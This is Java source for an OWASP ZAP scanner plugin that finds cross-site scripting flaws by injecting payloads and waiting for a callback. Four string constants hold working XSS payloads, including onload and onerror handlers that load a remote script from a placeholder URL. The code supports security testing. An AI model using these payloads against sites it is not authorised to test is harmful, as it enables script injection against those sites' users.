/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrulesAlpha;

import org.apache.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.model.Vulnerabilities;
import org.zaproxy.zap.model.Vulnerability;

import java.io.IOException;
import java.text.MessageFormat;

public class XssByCallbackScanner extends AbstractAppParamPlugin implements ChallengeCallbackPlugin{

    private static final Vulnerability VULN = Vulnerabilities.getVulnerability("wasc_8");
    private static final int PLUGIN_ID = 40031;
    private static final Logger LOG = Logger.getLogger(XssByCallbackScanner.class);

    // API for the specific challenge/response model
    // Should be a common object for all this plugin instances
    private static XssChallengeCallbackApi callbackApi = new XssChallengeCallbackApi();

    @Override
    public int getId() {
        return PLUGIN_ID;
    }

    @Override
    public String getDescription() {
        if (VULN != null) {
            return VULN.getDescription();
        }
        return "Failed to load vulnerability description from file";
    }

    @Override
    public int getCategory() {
        return Category.INJECTION;
    }

    @Override
    public String getSolution() {
        if (VULN != null) {
            return VULN.getSolution();
        }
        return "Failed to load vulnerability solution from file";
    }

    @Override
    public String getName() {
        return Constant.messages.getString("ascanalpha.xssbycallbackscanner.name");
    }

    @Override
    public String getReference() {
        if (VULN != null) {
            StringBuilder sb = new StringBuilder();
            for (String ref : VULN.getReferences()) {
                if (sb.length() > 0) {
                    sb.append('\n');
                }
                sb.append(ref);
            }
            return sb.toString();
        }
        return "Failed to load vulnerability reference from file";
    }

    @Override
    public String[] getDependency() {
        return null;
    }

    private static final String SIMPLE_SCRIPT_XSS_ATTACK = "<script src=\"{0}\"></script>";
    private static final String END_TAG_SCRIPT_XSS_ATTACK = "</script><script src=\"{0}\">";
    private static final String ON_LOAD_ATTRIBUTE_ATTACK = "\" onload=\"var s=document.createElement('script');s.src='{0}';document.getElementsByTagName('head')[0].appendChild(s);\" garbage=\"";
    private static final String ON_ERROR_ATTRIBUTE_ATTACK = "'\"><img src=x onerror=\"var s=document.createElement('script');s.src='{0}';document.getElementsByTagName('head')[0].appendChild(s);\">\n";

    private static final String[] XSS_ATTACK_PATTERNS = {
            SIMPLE_SCRIPT_XSS_ATTACK,
            END_TAG_SCRIPT_XSS_ATTACK,
            ON_LOAD_ATTRIBUTE_ATTACK,
            ON_ERROR_ATTRIBUTE_ATTACK
    };

    @Override
    public void init() {
    }

    @Override
    public void scan(HttpMessage httpMessage, String param, String value) {
        for (String attackStringPattern : XSS_ATTACK_PATTERNS) {
            String challenge = callbackApi.generateRandomChallenge();
            String callbackUrl = callbackApi.getCallbackUrl(challenge);
            String attackString = MessageFormat.format(attackStringPattern, callbackUrl);
            HttpMessage newMsg = getNewMsg();
            setParameter(newMsg, param, attackString);
            XssCallbackContext context = new XssCallbackContext(attackString, param);
            callbackApi.registerCallback(challenge, this, httpMessage, context);

            try {
                sendAndReceive(newMsg);
            } catch (IOException e) {
                LOG.warn(e.getMessage(), e);
            }
        }
    }

    /**
     * Notification for a successful plugin execution
     *
     * @param challenge the challenge callback that has been used
     * @param targetMessage the original message sent to the target containing the callback
     */
    @Override
    public void notifyCallback(String challenge, HttpMessage targetMessage, HttpMessage callbackMsg, Object context) {
        if (challenge == null) return;

        String evidence = callbackApi.getCallbackUrl(challenge);
        XssCallbackContext xssCallbackContext = (XssCallbackContext)context;
        String referer = callbackMsg.getRequestHeader().getHeader("Referer");
        String otherinfo = Constant.messages.getString("ascanalpha.xssbycallbackscanner.occurrence.noinformation");
        if(referer != null && !referer.equals("")){
            otherinfo = Constant.messages.getString("ascanalpha.xssbycallbackscanner.occurrence.information", referer);
        }

        // Alert the vulnerability to the main core
        bingo(
            Alert.RISK_HIGH,
            Alert.CONFIDENCE_MEDIUM,
            null, //URI
            xssCallbackContext.getParamName(), //param
            xssCallbackContext.getPayload(), //attack
            otherinfo,
            evidence,
            targetMessage);
    }

    private class XssCallbackContext{
        private String payload;
        private String paramName;

        XssCallbackContext(String payload, String paramName) {
            this.payload = payload;
            this.paramName = paramName;
        }

        public String getPayload() {
            return payload;
        }

        public String getParamName() {
            return paramName;
        }
    }
}
